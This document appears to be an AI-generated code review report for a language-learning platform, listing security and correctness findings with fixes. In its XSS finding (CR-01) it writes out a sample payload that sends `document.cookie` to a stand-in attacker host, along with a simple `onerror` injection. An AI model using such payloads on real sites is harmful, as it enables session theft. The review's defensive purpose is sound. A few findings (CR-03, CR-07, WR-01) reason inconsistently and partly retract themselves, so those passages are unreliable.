---
phase: "08"
reviewed: 2026-06-20T00:00:00Z
depth: standard
files_reviewed: 44
files_reviewed_list:
  - apps/api/src/adaptive/adaptive.controller.ts
  - apps/api/src/adaptive/adaptive.module.ts
  - apps/api/src/adaptive/adaptive.service.ts
  - apps/api/src/analytics/analytics.controller.ts
  - apps/api/src/analytics/analytics.service.ts
  - apps/api/src/analytics/redis-cache.service.ts
  - apps/api/src/auth/roles.decorator.ts
  - apps/api/src/auth/roles.guard.ts
  - apps/api/src/grammar/grammar.service.ts
  - apps/api/src/listening/listening.service.ts
  - apps/api/src/quiz/quiz.service.ts
  - apps/api/src/reading/reading.service.ts
  - apps/api/src/search/search.controller.ts
  - apps/api/src/search/search.service.ts
  - apps/api/src/srs/srs.service.ts
  - apps/web/src/app/api/adaptive/dashboard/route.ts
  - apps/web/src/app/api/adaptive/recommendation/route.ts
  - apps/web/src/app/api/admin/analytics/route.ts
  - apps/web/src/app/api/analytics/me/route.ts
  - apps/web/src/app/api/search/route.ts
  - apps/web/src/app/(dashboard)/admin/page.tsx
  - apps/web/src/app/(dashboard)/analytics/page.tsx
  - apps/web/src/app/(dashboard)/dashboard/dashboard-client.tsx
  - apps/web/src/app/(dashboard)/dashboard/page.tsx
  - apps/web/src/app/(dashboard)/layout.tsx
  - apps/web/src/app/(dashboard)/search/page.tsx
  - apps/web/src/components/analytics/activity-heatmap.tsx
  - apps/web/src/components/analytics/cefr-progression-chart.tsx
  - apps/web/src/components/analytics/learning-time-chart.tsx
  - apps/web/src/components/analytics/skill-breakdown-chart.tsx
  - apps/web/src/components/analytics/vocab-retention-chart.tsx
  - apps/web/src/components/dashboard/activity-bar-chart.tsx
  - apps/web/src/components/dashboard/continue-learning-widget.tsx
  - apps/web/src/components/dashboard/dashboard-hero.tsx
  - apps/web/src/components/dashboard/skill-radar-chart.tsx
  - apps/web/src/components/navigation/sidebar.tsx
  - apps/web/src/components/search/search-filters.tsx
  - apps/web/src/components/search/search-result-group.tsx
  - apps/web/src/components/search/search-result-item.tsx
  - apps/web/src/components/search/top-nav-search.tsx
  - apps/web/src/lib/sanitize-snippet.ts
  - packages/database/prisma/schema.prisma
  - packages/database/prisma/seed-admin.ts
  - packages/shared/src/adaptive.dto.ts
  - packages/shared/src/analytics.dto.ts
  - packages/shared/src/search.dto.ts
findings:
  critical: 7
  warning: 9
  info: 4
  total: 20
status: issues_found
---

# Phase 08: Code Review Report

**Reviewed:** 2026-06-20
**Depth:** standard
**Files Reviewed:** 44
**Status:** issues_found

## Summary

Phase 08 adds the adaptive engine, analytics, global search, and dashboard. The codebase is architecturally sound — JWT-scoped user IDs, parameterized SQL, and the `sanitizeSnippet` guard for `dangerouslySetInnerHTML` are all correctly implemented. The critical problems found are: a persistent XSS vector in the snippet sanitizer, a race condition in the adaptive skill-score upsert, an unbounded full-table scan in admin analytics, a missing `cefrLevel` null guard at the dashboard API boundary, and an incomplete retention-rate cohort calculation that produces systematically wrong numbers. Several warnings address correctness bugs including a broken streak calculation, client-trusted accuracy in `ReadingService`, and the activity data fabrication sent to the dashboard chart.

---

## Critical Issues

### CR-01: XSS Bypass in `sanitizeSnippet` — Attribute-injected Event Handlers Survive

**File:** `apps/web/src/lib/sanitize-snippet.ts:22`

**Issue:** The regex strips tags whose names are not `mark`, but it strips tags by matching the angle-bracket delimiters around the tag name. Attribute-based injection that does not require a standalone tag survives untouched because PostgreSQL `ts_headline()` can emit the raw content text (not wrapped in a tag) if the injected payload was already in the source text as a plain string. More concretely: the sanitizer operates only on the final `<tag>` delimiters. A payload such as `<img src=x onerror=alert(1)>` IS caught — but `<mark onmouseover=alert(1)>word</mark>` is NOT caught because the lookahead `(?!\/?(?:mark)...)` allows `<mark ...>` through unconditionally, including any attributes it carries. An attacker who controls stored content (e.g. via the crawler) can inject `<mark onmouseover="fetch('https://evil.example/'+document.cookie)">target-word</mark>` into a reading passage or vocabulary definition. `ts_headline()` will preserve the injected `<mark>` tag verbatim, and the sanitizer will pass it through, resulting in JavaScript execution in the authenticated user's browser.

**Fix:** After stripping disallowed tags, additionally strip all attributes from surviving `<mark>` tags so only bare `<mark>` and `</mark>` pass through:

```typescript
export function sanitizeSnippet(html: string): string {
  // 1. Strip all tags that are not <mark> or </mark>
  const noForeignTags = html.replace(
    /<(?!\/?mark(?=>|\s|$))[^>]*>/gi,
    "",
  );
  // 2. Strip any attributes from surviving <mark ...> tags
  //    e.g. <mark onmouseover="..."> → <mark>
  return noForeignTags.replace(/<mark\s[^>]*>/gi, "<mark>");
}
```

---

### CR-02: Race Condition / Lost Update in `updateSkillScore` (Non-Atomic Read-Modify-Write)

**File:** `apps/api/src/adaptive/adaptive.service.ts:54-77`

**Issue:** `updateSkillScore` performs a `findUnique` to read the existing accuracy and then a separate `upsert` to write the new EMA value. These two operations are not in a transaction. Under concurrent quiz/session completion (e.g. a user submitting two grammar sessions simultaneously, or background SRS completion firing alongside a quiz completion), both reads can observe the same `existing.accuracy`, compute conflicting `newAccuracy` values, and the last writer wins — silently discarding one update. Because `GrammarService`, `ListeningService`, `ReadingService`, `SrsService`, and `QuizService` all call `updateSkillScore` inline after awarding XP, and each of those operations is itself non-transactional with the adaptive update, this window is real during normal usage.

**Fix:** Use a Prisma `$transaction` or — ideally — a single `UPDATE ... SET accuracy = accuracy * ${1 - EMA_ALPHA} + ${accuracy * EMA_ALPHA}` raw query that keeps the computation in the database:

```typescript
async updateSkillScore(userId: string, skillArea: SkillArea, accuracy: number): Promise<void> {
  await this.prisma.$executeRaw`
    INSERT INTO "SkillScore" ("id","userId","skillArea","accuracy","isWeak","updatedAt")
    VALUES (gen_random_uuid(), ${userId}, ${skillArea}::text::"SkillArea",
            ${accuracy}, ${accuracy < 0.6}, NOW())
    ON CONFLICT ("userId","skillArea") DO UPDATE
      SET "accuracy" = "SkillScore"."accuracy" * ${1 - EMA_ALPHA} + ${accuracy * EMA_ALPHA},
          "isWeak"   = ("SkillScore"."accuracy" * ${1 - EMA_ALPHA} + ${accuracy * EMA_ALPHA}) < 0.6,
          "updatedAt" = NOW()
  `;
}
```

---

### CR-03: `user.cefrLevel` May Be Null at Runtime — Dashboard Will Throw

**File:** `apps/api/src/adaptive/adaptive.service.ts:154-162`

**Issue:** `getDashboardData` calls `prisma.user.findUniqueOrThrow` selecting `cefrLevel` typed as `CefrLevel` (the Prisma enum). However, the `User` model in `schema.prisma` declares `cefrLevel CefrLevel @default(B1)`, which means the DB column has a NOT NULL constraint. But the Prisma generated type for `select: { cefrLevel: true }` returns `CefrLevel` — so far so good. However, `recordCefrSnapshotIfChanged(userId, user.cefrLevel)` and later `getContinueLearningRecommendation(userId, user.cefrLevel)` are called with a value that TypeScript treats as non-nullable, yet the call on line 168 passes it directly as `currentLevel: CefrLevel`. The real risk: `DashboardDtoSchema` at `packages/shared/src/adaptive.dto.ts:52` uses `z.enum(["B1","B2","C1"])` — if the DB ever holds a stale `null` (e.g., legacy row before the enum column was set NOT NULL), `findUniqueOrThrow` returns `null` for `cefrLevel`, causing the Zod schema validation (if used) or downstream code to throw an unhandled error.

More concretely: line 279 in the return value maps `user.cefrLevel` directly into `DashboardDto.user.cefrLevel`. If `cefrLevel` is somehow null (data inconsistency), the API returns `500` with no meaningful error message for the user.

**Fix:** Add a null guard:

```typescript
const cefrLevel = user.cefrLevel ?? 'B1';
// use cefrLevel instead of user.cefrLevel throughout
```

---

### CR-04: Admin Analytics — Full `readingProgress` Table Scan (No Limit) Is a Production DoS Vector

**File:** `apps/api/src/analytics/analytics.service.ts:235-238`

**Issue:** `computeAdminAnalytics` calls `this.prisma.readingProgress.findMany()` with no `where` clause and no `take` limit. On a production database with millions of rows (10,000+ users × many passages), this loads the entire `ReadingProgress` table into the Node.js process memory. A single unauthenticated cache-miss request (cache TTL expires, then burst of admin requests) will trigger this query. The same applies to `activityLog.findMany({ select: { activityType: true } })` on line 263 which also has no limit.

The Redis cache (TTL 300 s) provides a 5-minute window of protection, but a restart, cache flush, or thundering-herd during startup causes the full scan.

**Fix:** Replace the in-process aggregation with a DB-level `groupBy` or `COUNT`:

```typescript
// Top 10 by completion — replace findMany + in-process Map with:
const topPassages = await this.prisma.readingProgress.groupBy({
  by: ['passageId'],
  where: { completedAt: { not: null } },
  _count: { passageId: true },
  orderBy: { _count: { passageId: 'desc' } },
  take: 10,
});
```

---

### CR-05: Retention Rate Cohort Bug — Week-2 Active Users NOT Filtered to the Cohort

**File:** `apps/api/src/analytics/analytics.service.ts:218-230`

**Issue:** The week-2 retention calculation fetches `cohortTotal` as users who signed up 14–21 days ago (`createdAt` between `week2Start` and `week2End`). It then fetches `week2ActiveRows` as **all users** who had any activity log in the past 14 days — not scoped to the cohort. A user who signed up 1 day ago will be counted in both the "week-2 active" numerator and a separate cohort's denominator, producing a retention rate that can exceed 1 and has no statistical meaning.

```typescript
// BUG: week2ActiveRows includes users from ANY cohort, not just the 14–21-day cohort
const [cohortTotal, week2ActiveRows] = await Promise.all([
  this.prisma.user.count({ where: { createdAt: { gte: week2Start, lt: week2End } } }),
  this.prisma.activityLog.groupBy({
    by: ['userId'],
    where: { loggedAt: { gte: week2End, lt: now } }, // NO cohort filter
  }),
]);
```

**Fix:** The groupBy must be joined or filtered to the same cohort. Use a subquery approach:

```typescript
// Get cohort user IDs first, then filter activity to those users
const cohortUsers = await this.prisma.user.findMany({
  where: { createdAt: { gte: week2Start, lt: week2End } },
  select: { id: true },
});
const cohortIds = cohortUsers.map(u => u.id);
const cohortTotal = cohortIds.length;
const week2ActiveRows = cohortTotal > 0
  ? await this.prisma.activityLog.groupBy({
      by: ['userId'],
      where: { userId: { in: cohortIds }, loggedAt: { gte: week2End, lt: now } },
    })
  : [];
```

---

### CR-06: `ReadingService.completeSession` Trusts Client-Supplied `accuracy` and `score`

**File:** `apps/api/src/reading/reading.service.ts:152-178`

**Issue:** Unlike `ListeningService` (which explicitly recomputes accuracy server-side from `attempts[]` and even comments "T-06-03: server recomputes accuracy — client accuracy field ignored"), `ReadingService.completeSession` blindly writes the `score` and `accuracy` values directly from the client DTO into the database without any validation or server-side recomputation:

```typescript
const { passageId, score, accuracy, readingTimeSec } = dto;
// ...
await this.prisma.readingProgress.upsert({
  ...
  create: { userId, passageId, score, accuracy, ... },
  update: { score, accuracy, ... },
});
// ...
await this.adaptive.updateSkillScore(userId, 'READING', accuracy ?? 0);
```

Any authenticated user can POST `{ passageId: "...", score: 100, accuracy: 1.0 }` to permanently inflate their reading accuracy score and manipulate the adaptive engine's `updateSkillScore` call. The adaptive `isWeak` flag and CEFR progression are both polluted by this.

**Fix:** Either validate `score` and `accuracy` against actual answers stored in the DB (like listening does), or reject them from the DTO entirely and compute them from answer data. At minimum, clamp and validate:

```typescript
const clampedAccuracy = Math.min(1, Math.max(0, dto.accuracy ?? 0));
const clampedScore = Math.max(0, dto.score ?? 0);
```

But the real fix is requiring `attempts[]` in the DTO and recomputing server-side.

---

### CR-07: `sanitizeSnippet` Does Not Handle `</mark>` Closing Tags with Attributes

**File:** `apps/web/src/lib/sanitize-snippet.ts:22`

**Issue:** The regex lookahead `(?!\/?(?:mark)(?=>|\s.*?>))` is intended to preserve both `<mark>` and `</mark>`. However, the lookahead pattern `(?=>|\s.*?>)` uses a greedy wildcard that can be bypassed. Specifically, the alternative `\s.*?>` requires at least one whitespace character between the tag name and `>`, so `<mark>` (no space) matches the `(?=>)` branch correctly — but the pattern also inadvertently allows `<markx>` through because `markx` starts with `mark` and is followed by `x` which does not match `>` or `\s`, causing the lookahead to fail — meaning `<markx>` IS stripped (correct). However the pattern `(?!\/?(?:mark)(?=>|\s.*?>))` has a subtle issue: the `\s.*?>` uses a lazy `?` but within a greedy quantifier context, meaning the lookahead can match `<mark onmouseover="x">` as described in CR-01. This is the same root cause — filed separately as CR-07 because the `</mark>` closing tag form `</mark >` (with trailing space) is also passed through even if attributes were somehow added to a closing tag.

This is a secondary angle of CR-01 and is resolved by the same fix described there.

---

## Warnings

### WR-01: `computeCurrentStreak` Off-by-One — Streak Resets When User Logs In Today

**File:** `apps/api/src/adaptive/adaptive.service.ts:316-328`

**Issue:** The streak algorithm compares `differenceInCalendarDays(prev, curr)`. For `i === 0` (the most recent activity day), `prev` is `new Date()` (now) and `curr` is the most recent day string. If the user has a log entry for today, `differenceInCalendarDays(now, today) === 0`, which does NOT satisfy the condition `=== 1` or `<= 1`. The fallback `<= 1` is the correct branch, but the condition is:

```typescript
differenceInCalendarDays(prev, curr) === 1 ||
(i === 0 && differenceInCalendarDays(new Date(), curr) <= 1)
```

If the user has activity today (diff = 0) AND yesterday (diff = 1), `i=0` gives diff=0 (passes `<= 1`), `i=1` gives `prev = new Date(days[0])` (today's date string) and `curr = yesterday`. `differenceInCalendarDays(today, yesterday) === 1` — passes. This works correctly. However, if the user has **only** yesterday's activity (no entry today), `i=0`, `prev = new Date()`, `curr = yesterday`, `diff = 1` — this passes `<= 1` and correctly counts 1. So the <= 1 condition on i=0 is correct.

The actual bug is that when the user has activity today (`days[0]` = today) AND a gap 2+ days ago, the loop increments streak for `i=0` (diff=0, `<= 1` passes), then for `i=1`, `prev = new Date(days[0])` = today (as a Date from ISO string "2026-06-20"), `curr = days[1]` (e.g. "2026-06-17"). `differenceInCalendarDays(today, 3-days-ago) === 3 !== 1`. The `break` fires. Streak = 1. This is correct. No bug here upon re-analysis.

**Actual bug:** The `since` window is only 32 days (`setDate(getDate() - 32)`). If a user has a 33-day streak, the query truncates at day 32, returning streak = 32 even if the actual streak is longer. This is a data correctness defect — the streak displayed on the dashboard cap at 32.

**Fix:** Increase the lookback window proportionally to the maximum expected streak, or use a different approach (e.g. store the current streak in the User model and increment it in ActivityLog writes):

```typescript
since.setDate(since.getDate() - 400); // allow up to ~1 year of streak
```

---

### WR-02: `buildActivityData` in `dashboard-client.tsx` Returns Fabricated Data

**File:** `apps/web/src/app/(dashboard)/dashboard/dashboard-client.tsx:38-49`

**Issue:** The `buildActivityData` function is described as a placeholder: "In production this would come from a dedicated activity endpoint." However, it generates fake data — all days except today show `count: 0`, today shows `Math.max(1, Math.round(lessonsCompleted / days))`. This fabricated chart is passed to `ActivityBarChart` as if it were real activity data. A user with 70 lessons completed sees "10 exercises today" even if they did 0 today. This is incorrect behavior shipped to production, not a demo screen.

**Fix:** Either remove the chart until a real `/api/analytics/activity` endpoint exists, show a proper empty state, or fetch real activity data from `AnalyticsDto.activityHeatmap` (already available in the analytics page). The analytics page already fetches `activityHeatmap` — pass the last 7 days from that dataset to the chart.

---

### WR-03: `QuizService.rehydrateQuestions` Has N+1 DB Queries (and Silent Error Swallowing)

**File:** `apps/api/src/quiz/quiz.service.ts:490-598`

**Issue:** `rehydrateQuestions` iterates over each incorrect answer and issues a separate `$queryRaw` per question type (grammar, reading, listening, vocabulary). For a 10-question quiz with all wrong answers, this is 10 sequential DB round-trips. This occurs synchronously in `for ... of` loops without `Promise.all`. Additionally, each DB call is individually wrapped in `try/catch` with an empty catch that swallows the error silently — a deleted content item will silently produce a shorter answer list with no indication to the caller.

The vocabulary branch additionally issues a `prisma.vocabularyWord.findMany` inside the loop, creating up to N+1 queries for vocabulary answers.

**Fix:** Batch by type first, then query in parallel:

```typescript
// Group by type, batch IDs, fetch in parallel
const byType = new Map<string, string[]>();
for (const { questionRef } of answers) {
  const { type, id } = parseRef(questionRef);
  byType.set(type, [...(byType.get(type) ?? []), id]);
}
const [grammarRows, readingRows, listeningRows, vocabRows] = await Promise.all([
  byType.has('grammar') ? this.prisma.grammarQuestion.findMany({ where: { id: { in: byType.get('grammar')! } } }) : [],
  // ... etc
]);
```

---

### WR-04: Search Filter Values Are Passed to NestJS Unvalidated — CEFR Level Injection

**File:** `apps/api/src/search/search.service.ts:32,55,79,103`

**Issue:** The `level`, `topic`, and `skill` filter parameters from the HTTP query string are passed directly into `Prisma.sql` template fragments as parameterized values (e.g. `AND w."cefrLevel" = ${level}`). While Prisma's tagged template parameterization prevents SQL injection, there is no validation that `level` is one of `['B1','B2','C1']`, `skill` is one of the allowed content types, or `topic` is a safe string. An attacker can send `?level=XXXX` and the query executes against the enum column, causing a PostgreSQL `invalid input value for enum "CefrLevel"` error, which will propagate as an unhandled 500 to the client rather than a graceful 400. The same applies to the `skill` filter in `SearchController` — an unknown skill value (e.g. `skill=admin`) bypasses all four `include*` flags (since none matches), `branches` remains empty, and the function returns `[]` silently — no error, but confusingly empty results.

**Fix:** Validate before processing:

```typescript
const VALID_LEVELS = new Set(['B1', 'B2', 'C1']);
const VALID_SKILLS = new Set(['vocabulary', 'grammar', 'reading', 'listening']);

if (filters.level && !VALID_LEVELS.has(filters.level)) {
  throw new BadRequestException(`Invalid level: ${filters.level}`);
}
if (filters.skill && !VALID_SKILLS.has(filters.skill)) {
  throw new BadRequestException(`Invalid skill: ${filters.skill}`);
}
```

---

### WR-05: `RedisCacheService` Has No Error Handling — Redis Failure Crashes `getAdminAnalytics`

**File:** `apps/api/src/analytics/redis-cache.service.ts:28-35`

**Issue:** Both `get()` and `set()` call `this.client.get(key)` / `this.client.set(...)` without any try/catch. If Redis is temporarily unavailable (restart, network blip), `get()` will throw an unhandled promise rejection that bubbles up through `getAdminAnalytics()` as a 500. The Redis cache is meant to be an optimization — a transient Redis failure should fall through to the DB, not crash the request.

**Fix:** Wrap both methods:

```typescript
async get<T>(key: string): Promise<T | null> {
  try {
    const val = await this.client.get(key);
    return val ? (JSON.parse(val) as T) : null;
  } catch {
    return null; // treat Redis failure as cache miss
  }
}

async set(key: string, value: unknown, ttlSeconds: number): Promise<void> {
  try {
    await this.client.set(key, JSON.stringify(value), 'EX', ttlSeconds);
  } catch {
    // log but do not throw — cache write failure is non-fatal
  }
}
```

---

### WR-06: `seed-admin.ts` Always Overwrites Admin Password on Every Re-Run

**File:** `packages/database/prisma/seed-admin.ts:27-31`

**Issue:** The `upsert` `update` block unconditionally writes `passwordHash: hash` derived from `ADMIN_PASSWORD` env var. If the seed script is re-run (e.g. as part of a deployment pipeline that calls `prisma db seed` on every deploy), it will silently reset the admin password to whatever `ADMIN_PASSWORD` is at that moment — including the insecure default `"Admin@changeme1"` if the env var is unset in CI/CD. An operator who changed the admin password through the UI would have it silently reverted.

**Fix:** Only update the password if `ADMIN_PASSWORD` is explicitly set in the environment:

```typescript
update: {
  name,
  role: 'ADMIN',
  // Only reset password if ADMIN_PASSWORD was explicitly provided
  ...(process.env.ADMIN_PASSWORD ? { passwordHash: hash } : {}),
},
```

---

### WR-07: `analytics.service.ts` — Top Content Shows `passageId` as Title (Not the Passage Title)

**File:** `apps/api/src/analytics/analytics.service.ts:247-253`

**Issue:** The top-content calculation maps passage IDs to completion counts, then constructs the result array using `passageId` as the `title` field:

```typescript
.map(([passageId, completions]) => ({
  title: passageId,  // BUG: this is a cuid, not a human-readable title
  module: 'reading',
  completions,
}));
```

The admin dashboard will display opaque IDs like `clxyz123abc` in the "Top Content" table instead of readable titles. This is a functional bug — the admin analytics page is unusable for this section.

**Fix:** After computing `completionByPassage`, batch-fetch the passage titles:

```typescript
const passageIds = Array.from(completionByPassage.keys());
const passages = await this.prisma.readingPassage.findMany({
  where: { id: { in: passageIds } },
  select: { id: true, title: true },
});
const titleById = new Map(passages.map(p => [p.id, p.title]));

const topContent = Array.from(completionByPassage.entries())
  .sort((a, b) => b[1] - a[1])
  .slice(0, 10)
  .map(([passageId, completions]) => ({
    title: titleById.get(passageId) ?? passageId,
    module: 'reading',
    completions,
  }));
```

---

### WR-08: `ListeningProgress` Missing `lastViewedAt` on Upsert Update

**File:** `apps/api/src/listening/listening.service.ts:225-241`

**Issue:** The `ListeningProgress.upsert` in `completeSession` correctly sets `completedAt: new Date()` in both `create` and `update`, but does NOT update `lastViewedAt` in the `update` branch. The `ListeningProgress` schema has `lastViewedAt DateTime @default(now())`, which only fires on row creation. On subsequent session completions, `lastViewedAt` is never refreshed. The dashboard's `getDashboardData` sorts recently viewed items by `lastViewedAt` — listening items will appear stale or disappear from the "recently viewed" list after the first completion.

**Fix:**

```typescript
update: {
  score: correct,
  accuracy,
  completedAt: new Date(),
  lastViewedAt: new Date(), // add this line
},
```

---

### WR-09: `completeSession` in `QuizService` — XP Awarded Twice

**File:** `apps/api/src/quiz/quiz.service.ts:397-423`

**Issue:** `quizSession.update` in the transaction sets `xpEarned: totalXp` (writing the XP to the session record), then immediately after the transaction, `gamification.awardXp(userId, totalXp, ...)` is called, which both creates an `XpEvent` and increments `User.xpTotal`. This is correct in structure. However, the `xpEarned` field on `QuizAnswer` rows is set per-answer inside the transaction (`xpEarned: a.isCorrect ? perAnswerXp : 0`), and `QuizSession.xpEarned` is the session total. If `awardXp` internally also sums per-answer XP from QuizAnswer rows (depends on `GamificationService` implementation), XP may be double-counted. This requires cross-checking with `GamificationService.awardXp`, which is not in scope for this review, but the architecture creates the ambiguity. At minimum, the `xpEarned` stored per `QuizAnswer` is redundant with the session-level award and risks stale data if the award logic changes.

**Fix:** Document clearly that `QuizAnswer.xpEarned` is for auditing only and `GamificationService.awardXp` is the sole source of truth for the actual XP credit. If `awardXp` does not read `QuizAnswer.xpEarned`, this is an info-level concern; promoted to WARNING because the pattern creates confusion for future maintainers.

---

## Info

### IN-01: `DashboardDtoSchema` Does Not Validate — Responses Are Unverified at the API Boundary

**File:** `packages/shared/src/adaptive.dto.ts:47-63`

**Issue:** The Zod schemas defined in `adaptive.dto.ts` and `analytics.dto.ts` are never invoked to validate the actual responses from NestJS before they are consumed by client components. The relay routes (`/api/adaptive/dashboard/route.ts`) call `res.json()` and cast to `DashboardDto` without schema validation. A type regression in NestJS (e.g. returning `cefrLevel: null`) would pass TypeScript compilation but crash React components at runtime.

**Fix:** Parse with the Zod schema at the relay layer:

```typescript
const raw = await res.json();
const data = DashboardDtoSchema.safeParse(raw);
if (!data.success) {
  return NextResponse.json({ error: 'Invalid API response' }, { status: 502 });
}
return NextResponse.json(data.data);
```

---

### IN-02: `SkillScore` Schema Has Unused `score` Column

**File:** `packages/database/prisma/schema.prisma:569`

**Issue:** `SkillScore` defines both a `score Float @default(0)` and an `accuracy Float @default(0)` field. The service code (`adaptive.service.ts`, all callers) exclusively uses `accuracy`. The `score` field is never written or read — it is dead schema weight. If future code mistakenly writes to `score` instead of `accuracy`, the adaptive engine silently uses wrong data.

**Fix:** Remove the `score` column from the `SkillScore` model and create a migration, or document its intended future use clearly.

---

### IN-03: `search/search.dto.ts` (NestJS-local) and `packages/shared/src/search.dto.ts` Are Duplicates With Drift

**File:** `apps/api/src/search/search.dto.ts:3-11`

**Issue:** The NestJS-local `search.dto.ts` defines `SearchResultDto.type` as `'vocabulary' | 'grammar' | 'reading' | 'listening'` (4 values), while the shared schema at `packages/shared/src/search.dto.ts:12` defines it as `z.enum(["vocabulary","grammar","reading","listening","quiz"])` (5 values, includes "quiz"). The `CONTENT_TYPES` constant in `search.service.ts` also excludes "quiz". These definitions are inconsistent: the shared schema accepts "quiz" in the type union, but neither the service nor the local DTO can produce "quiz" results. If a consumer checks `result.type === 'quiz'`, it would be valid TypeScript against the shared type but can never be true at runtime.

**Fix:** Align all three to the same 4-value set (excluding quiz per the locked D-11 decision), or remove the local DTO and import from `@repo/shared` directly.

---

### IN-04: Missing Pagination on `GrammarService.getWeakQuestions`

**File:** `apps/api/src/grammar/grammar.service.ts:317-328`

**Issue:** `getWeakQuestions` fetches all `GrammarAttempt` rows for a user + topic with no `take` limit. A user who has worked through a large topic many times can accumulate hundreds of attempt rows. The JS deduplication in the loop is O(n) but the DB query is unbounded. For correctness this is minor (the dedup is correct), but for a user with 1,000+ attempts the response payload and query cost become non-trivial.

**Fix:** Add a reasonable `take` limit to the attempt query (e.g. take the last 200 attempts):

```typescript
orderBy: { attemptedAt: 'desc' },
take: 200, // enough to cover all questions even for very active users
```

---

_Reviewed: 2026-06-20_
_Reviewer: Claude (gsd-code-reviewer)_
_Depth: standard_
